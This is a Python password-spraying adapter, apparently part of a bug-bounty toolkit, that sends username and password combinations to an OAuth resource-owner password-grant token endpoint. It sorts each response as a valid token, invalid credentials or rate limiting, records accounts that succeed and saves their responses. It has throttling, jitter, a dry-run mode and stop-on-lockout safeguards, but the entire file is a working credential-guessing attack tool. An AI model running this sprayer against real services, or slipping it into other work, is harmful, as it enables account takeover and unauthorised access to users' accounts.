#!/usr/bin/env python3
"""OAuth password-grant Spray 适配器；仅在已确认 ROPC 端点上使用。"""

from __future__ import annotations

import json
import os
import random
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from typing import Any

try:
    from tools.spray_contract import (
        append_attempt,
        build_ssl_context as _ssl_context,
        finish_run,
        insecure_enabled as _insecure_enabled,
        prepare_run,
        sha256_text,
        write_private_json,
    )
except ImportError:  # pragma: no cover
    from spray_contract import (
        append_attempt,
        build_ssl_context as _ssl_context,
        finish_run,
        insecure_enabled as _insecure_enabled,
        prepare_run,
        sha256_text,
        write_private_json,
    )


USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"
MAX_RESPONSE_BYTES = 64 * 1024


def _oauth_config() -> tuple[dict[str, str], dict[str, Any], dict[str, Any]]:
    client_id = os.environ.get("SPRAY_OAUTH_CLIENT_ID", "")
    client_secret = os.environ.get("SPRAY_OAUTH_CLIENT_SECRET", "")
    scope = os.environ.get("SPRAY_OAUTH_SCOPE", "")
    runtime = {"client_id": client_id, "client_secret": client_secret, "scope": scope}
    binding = {
        "grant_type": "password",
        "client_id": client_id,
        "client_secret_sha256": sha256_text(client_secret) if client_secret else "",
        "scope": scope,
        "tls_verify": not _insecure_enabled(),
    }
    shape = {
        "grant_type": "password",
        "client_id_set": bool(client_id),
        "client_secret_set": bool(client_secret),
        "scope_set": bool(scope),
        "tls_verify": not _insecure_enabled(),
    }
    return runtime, binding, shape


def _attempt(url: str, user: str, password: str, config: dict[str, str]) -> dict[str, Any]:
    fields = {"grant_type": "password", "username": user, "password": password}
    for key in ("client_id", "client_secret", "scope"):
        if config[key]:
            fields[key] = config[key]
    request = urllib.request.Request(
        url,
        data=urllib.parse.urlencode(fields).encode("utf-8"),
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        },
        method="POST",
    )
    started = time.monotonic()
    status = 0
    body = b""
    headers: dict[str, str] = {}
    try:
        with urllib.request.urlopen(request, timeout=15, context=_ssl_context()) as response:
            status = response.status
            headers = dict(response.headers.items())
            body = response.read(MAX_RESPONSE_BYTES)
    except urllib.error.HTTPError as exc:
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
        try:
            body = exc.read(MAX_RESPONSE_BYTES)
        except OSError:
            body = b""
    except (OSError, urllib.error.URLError, TimeoutError) as exc:
        return {
            "status_code": 0,
            "classification": "network_error",
            "credential_valid": None,
            "token_issued": False,
            "oauth_error": "",
            "duration_ms": int((time.monotonic() - started) * 1000),
            "error_kind": type(exc).__name__,
            "response": {},
            "headers": {},
        }

    try:
        payload = json.loads(body.decode("utf-8", errors="replace"))
    except json.JSONDecodeError:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    token = payload.get("access_token")
    token_issued = status == 200 and isinstance(token, str) and bool(token.strip())
    raw_error = payload.get("error") if isinstance(payload.get("error"), str) else ""
    oauth_error = raw_error if re.fullmatch(r"[A-Za-z0-9_.:-]{1,80}", raw_error) else "unknown_error"
    if token_issued:
        classification, credential_valid = "valid_token", True
    elif status == 429:
        classification, credential_valid = "rate_limited", None
    elif status == 503:
        classification, credential_valid = "guarded", None
    elif oauth_error == "invalid_grant":
        classification, credential_valid = "invalid_credentials", False
    else:
        classification, credential_valid = "ambiguous_candidate", None
    return {
        "status_code": status,
        "classification": classification,
        "credential_valid": credential_valid,
        "token_issued": token_issued,
        "oauth_error": oauth_error,
        "duration_ms": int((time.monotonic() - started) * 1000),
        "response": payload,
        "headers": headers,
    }


def main() -> int:
    context = None
    counters: Counter[str] = Counter()
    try:
        runtime_config, binding, shape = _oauth_config()
        context = prepare_run("oauth", config_binding=binding, request_shape=shape)
        counters.update(context.existing_counts or {})
        if context.dry_run:
            print(f"[+] Preflight: {context.preflight_path}")
            print(f"[+] {len(context.users)} users × {len(context.passwords)} passwords; network attempts=0")
            return 0

        stop_reason = "completed"
        status = "completed"
        consecutive_network_errors = 0
        valid_users = set(context.valid_users or set())
        for round_index, password in enumerate(context.passwords, 1):
            attempted_this_round = False
            for user in context.users:
                if user in valid_users:
                    continue
                attempt_key = context.attempt_key(user, password)
                if attempt_key in (context.completed_attempts or set()):
                    continue
                attempted_this_round = True
                result = _attempt(context.target_url, user, password, runtime_config)
                classification = result["classification"]
                counters[classification] += 1
                append_attempt(
                    context,
                    {
                        "tool": "builtin",
                        "round": round_index,
                        "user": user,
                        "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
                        "attempt_key": attempt_key,
                        "classification": classification,
                        "credential_valid": result["credential_valid"],
                        "token_issued": result["token_issued"],
                        "status_code": result["status_code"],
                        "duration_ms": result["duration_ms"],
                        "oauth_error": result["oauth_error"],
                        "error_kind": result.get("error_kind"),
                    },
                )

                if classification in {"valid_token", "ambiguous_candidate"}:
                    write_private_json(
                        context,
                        f"response-{sum(counters.values()):06d}.json",
                        {
                            "user": user,
                            "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
                            "classification": classification,
                            "status_code": result["status_code"],
                            "headers": result["headers"],
                            "response": result["response"],
                        },
                    )
                if classification == "valid_token":
                    valid_users.add(user)

                if classification == "network_error":
                    consecutive_network_errors += 1
                else:
                    consecutive_network_errors = 0
                if classification in {"rate_limited", "guarded", "ambiguous_candidate"}:
                    stop_reason, status = classification, "stopped"
                    raise StopIteration
                if consecutive_network_errors >= 3:
                    stop_reason, status = "network_error_threshold", "stopped"
                    raise StopIteration
                if classification == "valid_token" and not context.continue_on_hit:
                    stop_reason, status = "credential_valid", "stopped"
                    raise StopIteration

            if attempted_this_round and round_index < len(context.passwords):
                wait = max(0, context.delay + random.randint(-context.jitter, context.jitter))
                time.sleep(wait)

        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
        print(f"[+] Summary: {context.summary_path}")
        return 0
    except StopIteration:
        assert context is not None
        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
        print(f"[+] Summary: {context.summary_path}")
        return 0
    except KeyboardInterrupt:
        if context is not None and not context.dry_run:
            finish_run(context, status="interrupted", stop_reason="sigint", counters=dict(counters), exit_code=130)
        return 130
    except (OSError, ValueError) as exc:
        if context is not None and not context.dry_run:
            finish_run(context, status="error", stop_reason="tool_error", counters=dict(counters), exit_code=2)
        print(f"oauth adapter error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
